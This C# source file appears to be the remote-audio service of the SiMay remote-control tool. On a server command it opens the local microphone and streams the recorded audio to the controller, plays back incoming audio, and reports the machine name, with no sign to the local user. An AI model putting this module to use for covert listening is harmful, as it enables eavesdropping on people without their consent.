using System;
using SiMay.Core;
using SiMay.Core.Extensions;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.PacketModelBinding;
using SiMay.Core.Packets;
using SiMay.ServiceCore.Attributes;
using SiMay.ServiceCore.Extensions;
using SiMay.ServiceCore.ServiceSource;
using SiMay.Sockets.Tcp;
using SiMay.Sockets.Tcp.Session;
using WindSound;

namespace SiMay.ServiceCore.ControlService
{
    [ServiceName("远程语音")]
    [ServiceKey("RemoteAudioJob")]
    public class AudioService : ServiceManager, IServiceSource
    {
        private bool _isRun = true;
        private bool _isPlaying = false;
        private WinSoundRecord _Recorder = null;
        private WinSoundPlayer _Player = null;
        private PacketModelBinder<TcpSocketSaeaSession> _handlerBinder = new PacketModelBinder<TcpSocketSaeaSession>();
        public override void OnNotifyProc(TcpSocketCompletionNotify notify, TcpSocketSaeaSession session)
        {
            switch (notify)
            {
                case TcpSocketCompletionNotify.OnConnected:
                    break;
                case TcpSocketCompletionNotify.OnSend:
                    break;
                case TcpSocketCompletionNotify.OnDataReceiveing:
                    break;
                case TcpSocketCompletionNotify.OnDataReceived:
                    this._handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead(), this);
                    break;
                case TcpSocketCompletionNotify.OnClosed:
                    this._handlerBinder.Dispose();
                    this.Dispose();
                    break;
            }
        }
        [PacketHandler(MessageHead.S_GLOBAL_OK)]
        public void InitializeComplete(TcpSocketSaeaSession session)
        {
            SendAsyncToServer(MessageHead.C_MAIN_ACTIVE_APP,
                new ActiveAppPack()
                {
                    IdentifyId = AppConfiguartion.IdentifyId,
                    ServiceKey = this.GetType().GetServiceKey(),
                    OriginName = Environment.MachineName + "@" + (AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo)
                });
        }
        [PacketHandler(MessageHead.S_GLOBAL_ONCLOSE)]
        public void CloseSession(TcpSocketSaeaSession session)
        {
            _isRun = false;
            this.CloseSession();
        }
        private void OpenAudio(int samplesPerSecond, int bitsPerSample, int channels)
        {
            int inDeviceOpen = 0;
            int outDeviceOpen = 0;
            try
            {
                string waveInDeviceName = WinSound.GetWaveInDeviceNames().Count > 0 ? WinSound.GetWaveInDeviceNames()[0] : null;
                if (waveInDeviceName != null)
                {
                    _Recorder = new WinSoundRecord();
                    _Recorder.DataRecorded += Recorder_DataRecorded;
                    _Recorder.Open(waveInDeviceName, samplesPerSecond, bitsPerSample, channels, 1280, 8);
                }
                else
                {
                    inDeviceOpen = 1;
                }
            }
            catch { }

            try
            {
                string waveOutDeviceName = WinSound.GetWaveOutDeviceNames().Count > 0 ? WinSound.GetWaveOutDeviceNames()[0] : null;
                if (waveOutDeviceName != null)
                {
                    _Player = new WinSoundPlayer();
                    _Player.Open(waveOutDeviceName, samplesPerSecond, bitsPerSample, channels, 1280, 8);
                }
                else
                {
                    outDeviceOpen = 1;
                }
            }
            catch { }

            SendAsyncToServer(MessageHead.C_AUDIO_DEVICE_OPENSTATE,
                new AudioDeviceStatesPack()
                {
                    PlayerEnable = outDeviceOpen == 0 ? true : false,
                    RecordEnable = inDeviceOpen == 0 ? true : false
                });
        }

        private void Recorder_DataRecorded(byte[] bytes)
        {
            if (_isPlaying == true)
                return;

            SendAsyncToServer(MessageHead.C_AUDIO_DATA, bytes);
        }

        [PacketHandler(MessageHead.S_AUDIO_START)]
        public void SetOpenAudioInConfig(TcpSocketSaeaSession session)
        {
            var config = session.CompletedBuffer.GetMessageEntity<AudioOptionsPack>();
            this.OpenAudio(config.SamplesPerSecond, config.BitsPerSample, config.Channels);
        }

        [PacketHandler(MessageHead.S_AUDIO_DEIVCE_ONOFF)]
        public void SetAudioState(TcpSocketSaeaSession session)
        {
            var state = session.CompletedBuffer.GetMessagePayload().ToUnicodeString();
            if (state == "0")
                _isPlaying = true;
            else if (state == "1")
                _isPlaying = false;
        }

        [PacketHandler(MessageHead.S_AUDIO_DATA)]
        public void PlayerData(TcpSocketSaeaSession session)
        {
            byte[] payload = session.CompletedBuffer.GetMessagePayload();
            try
            {
                if (!_isRun || _Player == null || _isPlaying == false) return; //正在录音不播放

                _Player.PlayData(payload);
            }
            catch { }
        }

        private void Dispose()
        {
            _isRun = false;
            try
            {
                if (_Player != null)
                    _Player.Close();
            }
            catch { }
            try
            {
                if (_Recorder != null)
                    _Recorder.Stop();
            }
            catch { }
        }
    }
}